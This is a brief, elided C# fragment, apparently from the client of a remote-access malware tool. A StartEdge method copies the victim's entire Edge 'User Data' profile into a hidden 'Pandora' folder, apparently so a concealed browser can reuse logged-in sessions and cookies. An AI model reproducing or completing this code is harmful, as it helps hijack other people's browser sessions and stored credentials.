...
namespace Client.Helper.Browser
{
  public class Edge
  {
    ...
    public static bool StartEdge(bool duplicate)
    {
            bool done = false;
          ...
          if (duplicate)
          {
            try
            {
              if (!Directory.Exists(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Pandora"))
              {
                 ...
                 Outils.a.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\User Data", Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Pandora", true);
